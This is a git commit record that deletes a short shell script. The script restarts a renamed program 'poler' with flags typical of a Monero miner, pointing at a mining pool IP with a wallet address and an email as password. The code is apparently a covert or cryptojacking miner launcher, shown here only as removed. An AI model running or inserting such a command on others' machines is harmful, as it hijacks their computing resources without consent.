a3476bcb83287c5eea4f0f7a32e37940689a9e4a
burkabest <52100051+burkabest@users.noreply.github.com>
2019-08-05 16:41:15 -0400

    Delete 65.sh

--- 65.sh
+++
@@ -1,3 +0,0 @@
-pkill poler
-sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 8 -o 94.103.90.20:5997 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=myfirstss:robbertopp1@gmail.com -k
